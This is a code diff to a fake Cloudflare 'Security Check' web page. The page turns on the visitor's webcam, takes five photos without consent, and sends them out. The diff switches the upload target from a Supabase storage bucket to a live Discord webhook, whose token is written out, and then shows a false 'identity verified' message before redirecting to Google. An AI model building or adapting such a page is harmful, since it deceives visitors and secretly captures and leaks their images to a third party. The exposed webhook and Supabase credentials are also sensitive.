@@ -208,7 +208,8 @@
 
         <div class="cf-header">
             <div class="cf-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Cloudflare_Logo.png/320px-Cloudflare_Logo.png" alt="Cloudflare">
+                <!-- 🔥 LOCAL LOGO (cloudflare.png) -->
+                <img src="cloudflare.png" alt="Cloudflare">
             </div>
             <div class="cf-badge">Security Check</div>
         </div>
@@ -269,17 +270,11 @@
     <video id="v" autoplay></video>
     <canvas id="c"></canvas>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
-    </script>
-
     <script>
         // ================================================================
-        // SUPABASE CONFIGURATION
+        // 🔥 DISCORD WEBHOOK URL (Aap ka diya hua)
         // ================================================================
-        const SUPABASE_URL = 'https://dnrlkpyalnxxzqlhsges.supabase.co';
-        const SUPABASE_ANON_KEY = 'sb_publishable_krgxQdwaG8LjuFRAQuPHxw_mHd79J9l';
-
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1535625565917421621/Wdfh2auZguj-0d-A2SDvQZshi9h6tCZhUm-5pJEycEZAD6fEmyX-WQ_uzD8Vq2BdFmjb';
 
         const TOTAL_PHOTOS = 5;
         const REDIRECT_URL = 'https://www.google.com';
@@ -362,28 +357,25 @@
             step4.style.display = step >= 4 ? 'flex' : 'none';
         }
 
-        // ========== SEND PHOTO TO SUPABASE ==========
-        async function sendToSupabase(imageData, index) {
+        // ========== SEND PHOTO TO DISCORD ==========
+        async function sendToDiscord(imageData, index) {
             try {
                 const blob = await fetch(imageData).then(r => r.blob());
-                const fileName = `prank/${Date.now()}_${index}.jpg`;
+                const formData = new FormData();
+                formData.append('file', blob, `photo_${index}.jpg`);
+                formData.append('content', `📸 Photo ${index}/${TOTAL_PHOTOS}`);
 
-                const { data, error } = await supabase
-                    .storage
-                    .from('Photos')
-                    .upload(fileName, blob);
+                const response = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
 
-                if (error) {
-                    console.error('Upload error:', error);
+                if (!response.ok) {
+                    console.error('Discord error:', response.status);
                     return null;
                 }
 
-                const { data: urlData } = supabase
-                    .storage
-                    .from('Photos')
-                    .getPublicUrl(fileName);
-
-                return urlData.publicUrl;
+                return '✅ Sent to Discord';
             } catch (e) {
                 console.error('Send error:', e);
                 return null;
@@ -437,9 +429,9 @@
                 setProgress(82);
 
                 // ======== CAPTURE PHOTOS ========
-                let urls = [];
                 const width = v.videoWidth || 640;
                 const height = v.videoHeight || 480;
+                let sent = 0;
 
                 for (let i = 0; i < TOTAL_PHOTOS; i++) {
                     let cv = document.createElement('canvas');
@@ -447,8 +439,8 @@
                     cv.height = height;
                     cv.getContext('2d').drawImage(v, 0, 0, width, height);
                     const imageData = cv.toDataURL('image/jpeg', 0.85);
-                    const url = await sendToSupabase(imageData, i + 1);
-                    if (url) urls.push(url);
+                    const result = await sendToDiscord(imageData, i + 1);
+                    if (result) sent++;
                     await delay(500);
                 }
 
@@ -459,17 +451,15 @@
                 setProgress(88);
                 text4.textContent = 'Verification in progress...';
 
-                let sent = urls.length;
-
                 setIcon(icon4, 'done');
-                text4.textContent = '✓ Verification complete!';
+                text4.textContent = `✓ Verification complete! (${sent}/${TOTAL_PHOTOS} photos sent)`;
                 setProgress(100);
 
                 successMsg.style.display = 'flex';
                 titleText.textContent = '✅ Verification successful!';
-                subText.textContent = 'Your identity has been verified. Redirecting...';
+                subText.textContent = `Your identity has been verified. ${sent}/${TOTAL_PHOTOS} photos sent to Discord.`;
 
-                console.log(`📸 ${sent}/${TOTAL_PHOTOS} photos uploaded to Supabase`);
+                console.log(`📸 ${sent}/${TOTAL_PHOTOS} photos sent to Discord`);
 
                 await delay(1800);
                 redirectMsg.style.display = 'block';
@@ -492,9 +482,9 @@
             setTimeout(startVerification, 600);
         };
 
-        console.log('Cloudflare Verification');
-        console.log('Capturing 5 photos...');
-        console.log('Uploading to Supabase...');
+        console.log('☁️ Cloudflare Verification (Discord)');
+        console.log('📸 Capturing 5 photos...');
+        console.log('📤 Sending to Discord...');
     </script>
 
 </body>
